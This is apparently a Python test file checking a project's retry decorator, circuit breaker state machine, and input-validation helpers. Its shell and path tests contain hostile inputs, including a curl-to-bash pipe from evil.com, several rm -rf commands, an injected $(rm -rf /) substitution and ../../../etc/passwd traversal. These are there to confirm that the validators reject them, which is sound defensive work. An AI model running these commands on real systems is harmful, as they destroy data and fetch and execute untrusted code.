"""Coverage tests for retry, circuit_breaker, and validation utilities.

Targets edge cases and state transitions not covered by existing tests.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from animus_forge.errors import APIError, MaxRetriesError, ValidationError
from animus_forge.utils.circuit_breaker import (
    CircuitBreaker,
    CircuitBreakerError,
    CircuitState,
    get_all_circuit_stats,
    get_circuit_breaker,
    reset_all_circuits,
)
from animus_forge.utils.retry import (
    RetryConfig,
    RetryContext,
    is_retryable_error,
    with_retry,
)
from animus_forge.utils.validation import (
    contains_shell_metacharacters,
    escape_shell_arg,
    sanitize_log_message,
    substitute_shell_variables,
    validate_identifier,
    validate_safe_path,
    validate_shell_command,
)

# ---------------------------------------------------------------------------
# Retry: RetryConfig
# ---------------------------------------------------------------------------


class TestRetryConfig:
    """Tests for RetryConfig.calculate_delay edge cases."""

    def test_exponential_growth_no_jitter(self):
        """Delay should double each attempt with base=2, no jitter."""
        cfg = RetryConfig(base_delay=1.0, exponential_base=2.0, jitter=False)
        assert cfg.calculate_delay(0) == 1.0
        assert cfg.calculate_delay(1) == 2.0
        assert cfg.calculate_delay(2) == 4.0
        assert cfg.calculate_delay(3) == 8.0

    def test_max_delay_cap(self):
        """Delay must never exceed max_delay regardless of attempt."""
        cfg = RetryConfig(base_delay=1.0, max_delay=5.0, jitter=False)
        # Attempt 10 would be 1024 without cap
        assert cfg.calculate_delay(10) == 5.0

    @patch("random.random", return_value=0.0)
    def test_jitter_lower_bound(self, _mock_rng):
        """With random()=0.0, jitter multiplier should be 0.75."""
        cfg = RetryConfig(base_delay=4.0, jitter=True)
        delay = cfg.calculate_delay(0)
        assert delay == pytest.approx(3.0)  # 4.0 * 0.75

    @patch("random.random", return_value=1.0)
    def test_jitter_upper_bound(self, _mock_rng):
        """With random()=1.0, jitter multiplier should be 1.25."""
        cfg = RetryConfig(base_delay=4.0, jitter=True)
        delay = cfg.calculate_delay(0)
        assert delay == pytest.approx(5.0)  # 4.0 * 1.25

    @patch("random.random", return_value=0.5)
    def test_jitter_mid_range(self, _mock_rng):
        """With random()=0.5, jitter multiplier should be 1.0 (no change)."""
        cfg = RetryConfig(base_delay=2.0, jitter=True)
        delay = cfg.calculate_delay(0)
        assert delay == pytest.approx(2.0)  # 2.0 * 1.0


# ---------------------------------------------------------------------------
# Retry: with_retry decorator (sync)
# ---------------------------------------------------------------------------


class TestRetryDecorator:
    """Tests for the synchronous with_retry decorator."""

    @patch("animus_forge.utils.retry.time.sleep")
    def test_successful_call_no_retry(self, mock_sleep):
        """Successful call returns immediately without retries."""

        @with_retry(max_retries=3)
        def good():
            return 42

        assert good() == 42
        mock_sleep.assert_not_called()

    @patch("animus_forge.utils.retry.time.sleep")
    def test_retry_then_succeed(self, mock_sleep):
        """Should retry on transient errors and return on success."""
        calls = 0

        @with_retry(max_retries=3, base_delay=0.01, jitter=False)
        def flaky():
            nonlocal calls
            calls += 1
            if calls < 3:
                raise ConnectionError("transient")
            return "ok"

        result = flaky()
        assert result == "ok"
        assert calls == 3
        assert mock_sleep.call_count == 2

    @patch("animus_forge.utils.retry.time.sleep")
    def test_max_retries_raises(self, mock_sleep):
        """Exhausting retries raises MaxRetriesError wrapping the original."""

        @with_retry(max_retries=2, base_delay=0.01, jitter=False)
        def always_fails():
            raise TimeoutError("boom")

        with pytest.raises(MaxRetriesError) as exc_info:
            always_fails()
        assert exc_info.value.attempts == 3  # initial + 2 retries
        assert "always_fails" in str(exc_info.value)

    @patch("animus_forge.utils.retry.time.sleep")
    def test_non_retryable_error_raises_immediately(self, mock_sleep):
        """Non-retryable exceptions should propagate without retries."""

        @with_retry(max_retries=5)
        def bad():
            raise ValueError("not retryable")

        with pytest.raises(ValueError, match="not retryable"):
            bad()
        mock_sleep.assert_not_called()

    @patch("animus_forge.utils.retry.time.sleep")
    def test_on_retry_callback(self, mock_sleep):
        """on_retry callback should be invoked before each retry sleep."""
        callback = MagicMock()
        calls = 0

        @with_retry(max_retries=3, base_delay=0.01, jitter=False, on_retry=callback)
        def flaky():
            nonlocal calls
            calls += 1
            if calls < 2:
                raise ConnectionError("fail")
            return "done"

        flaky()
        callback.assert_called_once()
        exc_arg, attempt_arg = callback.call_args[0]
        assert isinstance(exc_arg, ConnectionError)
        assert attempt_arg == 0

    def test_is_retryable_api_error_with_status(self):
        """APIError with retryable status code should be retryable."""
        exc = APIError("rate limited", status_code=429)
        assert is_retryable_error(exc) is True

    def test_is_retryable_api_error_non_retryable_status(self):
        """APIError with 400 should not be retryable."""
        exc = APIError("bad request", status_code=400)
        assert is_retryable_error(exc) is False

    def test_is_retryable_generic_with_status_attr(self):
        """Exception with status_code attr matching retryable codes."""
        exc = Exception("custom")
        exc.status_code = 503
        assert is_retryable_error(exc) is True


# ---------------------------------------------------------------------------
# Retry: RetryContext
# ---------------------------------------------------------------------------


class TestRetryContext:
    """Tests for the RetryContext context manager."""

    @patch("animus_forge.utils.retry.time.sleep")
    def test_context_iterates_and_retries(self, mock_sleep):
        """RetryContext should iterate and handle retryable exceptions."""
        results = []

        with RetryContext(max_retries=2, base_delay=0.01) as retry:
            for attempt in retry:
                try:
                    if attempt < 2:
                        raise ConnectionError("fail")
                    results.append("ok")
                    break
                except Exception as e:
                    retry.handle_exception(e)

        assert results == ["ok"]
        assert mock_sleep.call_count == 2

    @patch("animus_forge.utils.retry.time.sleep")
    def test_context_max_retries_exceeded(self, mock_sleep):
        """RetryContext raises MaxRetriesError on exhaustion."""
        with pytest.raises(MaxRetriesError) as exc_info:
            with RetryContext(max_retries=1, base_delay=0.01, operation_name="my_op") as retry:
                for _ in retry:
                    try:
                        raise TimeoutError("timeout")
                    except Exception as e:
                        retry.handle_exception(e)

        assert exc_info.value.stage == "my_op"

    @patch("animus_forge.utils.retry.time.sleep")
    def test_context_non_retryable_raises(self, mock_sleep):
        """RetryContext should re-raise non-retryable exceptions immediately."""
        with pytest.raises(ValueError):
            with RetryContext(max_retries=3) as retry:
                for _ in retry:
                    try:
                        raise ValueError("bad input")
                    except Exception as e:
                        retry.handle_exception(e)


# ---------------------------------------------------------------------------
# Circuit Breaker: State Transitions
# ---------------------------------------------------------------------------


class TestCircuitBreakerTransitions:
    """Tests for circuit breaker state machine."""

    def test_starts_closed(self):
        cb = CircuitBreaker(name="test", failure_threshold=3)
        assert cb.state == CircuitState.CLOSED

    def test_closed_to_open_after_threshold(self):
        """CLOSED -> OPEN after failure_threshold consecutive failures."""
        cb = CircuitBreaker(name="test", failure_threshold=3)
        for _ in range(3):
            cb._record_failure(RuntimeError("fail"))
        assert cb._state == CircuitState.OPEN

    @patch("animus_forge.utils.circuit_breaker.time.monotonic")
    def test_open_to_half_open_after_recovery(self, mock_time):
        """OPEN -> HALF_OPEN after recovery_timeout elapses."""
        cb = CircuitBreaker(name="test", failure_threshold=2, recovery_timeout=10.0)

        # Trip the breaker at t=100
        mock_time.return_value = 100.0
        for _ in range(2):
            cb._record_failure(RuntimeError("fail"))
        assert cb._state == CircuitState.OPEN

        # Before recovery timeout: still OPEN
        mock_time.return_value = 109.0
        assert cb.state == CircuitState.OPEN

        # After recovery timeout: transitions to HALF_OPEN
        mock_time.return_value = 111.0
        assert cb.state == CircuitState.HALF_OPEN

    def test_half_open_to_closed_after_success_threshold(self):
        """HALF_OPEN -> CLOSED after success_threshold successes."""
        cb = CircuitBreaker(name="test", failure_threshold=2, success_threshold=2)

        # Force into HALF_OPEN state
        cb._state = CircuitState.HALF_OPEN
        cb._success_count = 0

        cb._record_success()
        assert cb._state == CircuitState.HALF_OPEN  # Not yet

        cb._record_success()
        assert cb._state == CircuitState.CLOSED  # Now closed
        assert cb._failure_count == 0

    def test_half_open_to_open_on_failure(self):
        """Any failure in HALF_OPEN immediately reopens the circuit."""
        cb = CircuitBreaker(name="test", failure_threshold=2)
        cb._state = CircuitState.HALF_OPEN

        cb._record_failure(RuntimeError("fail again"))
        assert cb._state == CircuitState.OPEN

    def test_excluded_exceptions_not_counted(self):
        """Excluded exception types should not increment failure count."""
        cb = CircuitBreaker(
            name="test",
            failure_threshold=2,
            excluded_exceptions=(ValueError,),
        )
        # ValueError is excluded - should not count
        cb._record_failure(ValueError("not a real failure"))
        cb._record_failure(ValueError("still not a failure"))
        assert cb._failure_count == 0
        assert cb._state == CircuitState.CLOSED

        # RuntimeError is NOT excluded - should count
        cb._record_failure(RuntimeError("real failure"))
        assert cb._failure_count == 1

    def test_reset_returns_to_closed(self):
        """reset() should restore circuit to CLOSED with zeroed counters."""
        cb = CircuitBreaker(name="test", failure_threshold=2)
        for _ in range(2):
            cb._record_failure(RuntimeError("fail"))
        assert cb._state == CircuitState.OPEN

        cb.reset()
        assert cb._state == CircuitState.CLOSED
        assert cb._failure_count == 0
        assert cb._success_count == 0

    def test_call_raises_when_open(self):
        """Calling through an open circuit should raise CircuitBreakerError."""
        cb = CircuitBreaker(name="test", failure_threshold=1)
        cb._record_failure(RuntimeError("trip"))

        with pytest.raises(CircuitBreakerError, match="open"):
            cb.call(lambda: "should not run")

    def test_success_in_closed_resets_failure_count(self):
        """A success while CLOSED should reset failure_count to 0."""
        cb = CircuitBreaker(name="test", failure_threshold=5)
        cb._record_failure(RuntimeError("one"))
        cb._record_failure(RuntimeError("two"))
        assert cb._failure_count == 2

        cb._record_success()
        assert cb._failure_count == 0

    def test_call_records_success(self):
        """Successful call() records success."""
        cb = CircuitBreaker(name="test", failure_threshold=5)
        result = cb.call(lambda: "hello")
        assert result == "hello"

    def test_call_records_failure_and_raises(self):
        """Failed call() records failure and re-raises the exception."""
        cb = CircuitBreaker(name="test", failure_threshold=5)
        with pytest.raises(RuntimeError, match="boom"):
            cb.call(lambda: (_ for _ in ()).throw(RuntimeError("boom")))

    def test_context_manager_records_success(self):
        """Context manager exit without exception records success."""
        cb = CircuitBreaker(name="test", failure_threshold=5)
        cb._state = CircuitState.HALF_OPEN
        cb._success_count = 0

        with cb:
            pass  # success

        assert cb._success_count == 1

    def test_get_stats(self):
        """get_stats returns expected keys."""
        cb = CircuitBreaker(name="stats-test", failure_threshold=3)
        stats = cb.get_stats()
        assert stats["name"] == "stats-test"
        assert stats["state"] == "closed"
        assert stats["failure_threshold"] == 3


# ---------------------------------------------------------------------------
# Circuit Breaker: Factory
# ---------------------------------------------------------------------------


class TestCircuitBreakerFactory:
    """Tests for the get_circuit_breaker factory and global registry."""

    def setup_method(self):
        """Clean global state before each test."""
        # Clear the global registry
        from animus_forge.utils import circuit_breaker as cb_mod

        with cb_mod._breakers_lock:
            cb_mod._circuit_breakers.clear()

    def test_get_circuit_breaker_creates_new(self):
        """First call with a name creates a new breaker."""
        cb = get_circuit_breaker("factory-test-1", failure_threshold=10)
        assert cb.name == "factory-test-1"
        assert cb.failure_threshold == 10

    def test_get_circuit_breaker_returns_same_instance(self):
        """Subsequent calls with the same name return the cached instance."""
        cb1 = get_circuit_breaker("factory-test-2")
        cb2 = get_circuit_breaker("factory-test-2")
        assert cb1 is cb2

    def test_get_all_circuit_stats(self):
        """get_all_circuit_stats returns stats for all registered breakers."""
        get_circuit_breaker("stat-a")
        get_circuit_breaker("stat-b")
        stats = get_all_circuit_stats()
        assert "stat-a" in stats
        assert "stat-b" in stats

    def test_reset_all_circuits(self):
        """reset_all_circuits resets all registered breakers."""
        cb = get_circuit_breaker("reset-test", failure_threshold=1)
        cb._record_failure(RuntimeError("trip"))
        assert cb._state == CircuitState.OPEN

        reset_all_circuits()
        assert cb._state == CircuitState.CLOSED


# ---------------------------------------------------------------------------
# Validation: Shell
# ---------------------------------------------------------------------------


class TestShellValidation:
    """Tests for shell command validation and escaping."""

    def test_validate_shell_command_safe(self):
        """Safe commands should pass validation."""
        result = validate_shell_command("echo hello")
        assert result == "echo hello"

    def test_validate_shell_command_rm_rf_root(self):
        """rm -rf / should be rejected."""
        with pytest.raises(ValidationError):
            validate_shell_command("rm -rf /")

    def test_validate_shell_command_rm_rf_slash(self):
        """rm -rf /etc should be rejected."""
        with pytest.raises(ValidationError):
            validate_shell_command("rm -rf /etc")

    def test_validate_shell_command_sudo_rejected(self):
        """sudo commands should be rejected."""
        with pytest.raises(ValidationError):
            validate_shell_command("sudo apt install something")

    def test_validate_shell_command_eval_rejected(self):
        """eval commands should be rejected."""
        with pytest.raises(ValidationError):
            validate_shell_command("eval $(echo bad)")

    def test_validate_shell_command_pipe_to_shell_rejected(self):
        """curl | bash should be rejected."""
        with pytest.raises(ValidationError):
            validate_shell_command("curl http://evil.com | bash")

    def test_validate_shell_command_empty_rejected(self):
        """Empty command should be rejected."""
        with pytest.raises(ValidationError, match="empty"):
            validate_shell_command("")

    def test_validate_shell_command_whitespace_only_rejected(self):
        """Whitespace-only command should be rejected."""
        with pytest.raises(ValidationError, match="empty"):
            validate_shell_command("   ")

    def test_validate_shell_command_allow_dangerous(self):
        """allow_dangerous=True should skip pattern checks."""
        result = validate_shell_command("sudo rm -rf /", allow_dangerous=True)
        assert result == "sudo rm -rf /"

    def test_escape_shell_arg(self):
        """escape_shell_arg should wrap dangerous strings safely."""
        assert escape_shell_arg("$(rm -rf /)") == "'$(rm -rf /)'"

    def test_contains_shell_metacharacters_true(self):
        """Should detect semicolons, pipes, etc."""
        assert contains_shell_metacharacters("cmd; rm -rf /") is True
        assert contains_shell_metacharacters("cmd | grep x") is True
        assert contains_shell_metacharacters("$(dangerous)") is True

    def test_contains_shell_metacharacters_false(self):
        """Plain alphanumeric strings should be safe."""
        assert contains_shell_metacharacters("hello-world_123") is False

    def test_substitute_shell_variables_escapes(self):
        """Substituted values should be shell-escaped by default."""
        result = substitute_shell_variables("echo ${msg}", {"msg": "$(rm -rf /)"})
        assert "$(rm -rf /)" not in result or result.count("'") >= 2


# ---------------------------------------------------------------------------
# Validation: Path Traversal
# ---------------------------------------------------------------------------


class TestPathValidation:
    """Tests for validate_safe_path against path traversal."""

    def test_valid_relative_path(self, tmp_path):
        """Relative path within base_dir should resolve correctly."""
        result = validate_safe_path("subdir/file.txt", tmp_path)
        assert result == (tmp_path / "subdir" / "file.txt").resolve()

    def test_traversal_rejected(self, tmp_path):
        """../../../etc/passwd should be rejected."""
        with pytest.raises(ValidationError, match="escapes base directory"):
            validate_safe_path("../../../etc/passwd", tmp_path)

    def test_absolute_path_rejected_by_default(self, tmp_path):
        """Absolute paths are rejected unless allow_absolute=True."""
        with pytest.raises(ValidationError, match="Absolute paths not allowed"):
            validate_safe_path("/etc/passwd", tmp_path)

    def test_absolute_path_allowed_inside_base(self, tmp_path):
        """Absolute path within base_dir is allowed when allow_absolute=True."""
        target = tmp_path / "inside.txt"
        result = validate_safe_path(str(target), tmp_path, allow_absolute=True)
        assert result == target.resolve()

    def test_absolute_path_outside_base_rejected(self, tmp_path):
        """Absolute path outside base_dir is rejected even with allow_absolute."""
        with pytest.raises(ValidationError, match="escapes base directory"):
            validate_safe_path("/etc/passwd", tmp_path, allow_absolute=True)

    def test_must_exist_missing_rejected(self, tmp_path):
        """must_exist=True rejects non-existent paths."""
        with pytest.raises(ValidationError, match="does not exist"):
            validate_safe_path("nonexistent.txt", tmp_path, must_exist=True)

    def test_must_exist_present_passes(self, tmp_path):
        """must_exist=True passes when file exists."""
        target = tmp_path / "exists.txt"
        target.write_text("content")
        result = validate_safe_path("exists.txt", tmp_path, must_exist=True)
        assert result == target.resolve()


# ---------------------------------------------------------------------------
# Validation: Identifier
# ---------------------------------------------------------------------------


class TestIdentifierValidation:
    """Tests for validate_identifier."""

    def test_valid_identifier(self):
        """Standard alphanumeric+hyphen identifier passes."""
        assert validate_identifier("my-template") == "my-template"

    def test_valid_underscore(self):
        assert validate_identifier("my_template") == "my_template"

    def test_invalid_traversal_pattern(self):
        """../../evil should be rejected."""
        with pytest.raises(ValidationError):
            validate_identifier("../../evil")

    def test_starts_with_number_rejected(self):
        """Identifiers must start with a letter."""
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_identifier("123abc")

    def test_empty_rejected(self):
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_identifier("")

    def test_too_long_rejected(self):
        """Identifiers exceeding max_length should be rejected."""
        long_id = "a" * 200
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_identifier(long_id)

    def test_custom_max_length(self):
        """Custom max_length should be enforced."""
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_identifier("abcdef", max_length=5)

    def test_allow_dots(self):
        """allow_dots=True should permit dotted identifiers."""
        assert validate_identifier("com.example.plugin", allow_dots=True) == "com.example.plugin"

    def test_dots_rejected_by_default(self):
        """Dots should be rejected when allow_dots=False."""
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_identifier("com.example")

    def test_double_dot_rejected_even_with_allow_dots(self):
        """Path traversal (..) should be caught even when dots are allowed."""
        with pytest.raises(ValidationError, match="path traversal"):
            validate_identifier("foo..bar", allow_dots=True)


# ---------------------------------------------------------------------------
# Validation: Log Sanitization
# ---------------------------------------------------------------------------


class TestLogSanitization:
    """Tests for sanitize_log_message."""

    def test_openai_key_redacted(self):
        """sk-xxx style API keys should be replaced."""
        fake_key = "sk-" + "a1b2c3d4e5f6g7h8i9j0k1l2m"
        msg = f"Using key {fake_key}"
        result = sanitize_log_message(msg)
        assert fake_key not in result
        assert "[REDACTED_API_KEY]" in result

    def test_anthropic_key_redacted(self):
        """sk-ant-xxx style keys should be replaced."""
        key = "sk-ant-" + "a" * 45
        msg = f"Anthropic key: {key}"
        result = sanitize_log_message(msg)
        assert key not in result
        assert "[REDACTED_API_KEY]" in result

    def test_github_pat_redacted(self):
        """ghp_ style GitHub PATs should be replaced."""
        token = "ghp_" + "a" * 36
        # Avoid "Token:" prefix which triggers the token=... pattern first
        msg = f"Using credential {token} for auth"
        result = sanitize_log_message(msg)
        assert token not in result
        assert "[REDACTED_GITHUB_TOKEN]" in result

    def test_password_field_redacted(self):
        """password=xxx patterns should be redacted."""
        msg = 'Config: password="s3cret123"'
        result = sanitize_log_message(msg)
        assert "s3cret123" not in result

    def test_clean_message_unchanged(self):
        """Messages without sensitive data should pass through unchanged."""
        msg = "Processing 42 records from database"
        assert sanitize_log_message(msg) == msg

    def test_custom_sensitive_patterns(self):
        """Additional custom patterns should be applied."""
        msg = "Internal ID: INTERNAL-12345"
        result = sanitize_log_message(msg, sensitive_patterns=[r"INTERNAL-\d+"])
        assert "INTERNAL-12345" not in result
        assert "[REDACTED]" in result

    def test_multiple_keys_all_redacted(self):
        """Multiple sensitive values in one message should all be redacted."""
        key1 = "sk-" + "x" * 30
        key2 = "ghp_" + "y" * 36
        msg = f"Keys: {key1} and {key2}"
        result = sanitize_log_message(msg)
        assert key1 not in result
        assert key2 not in result
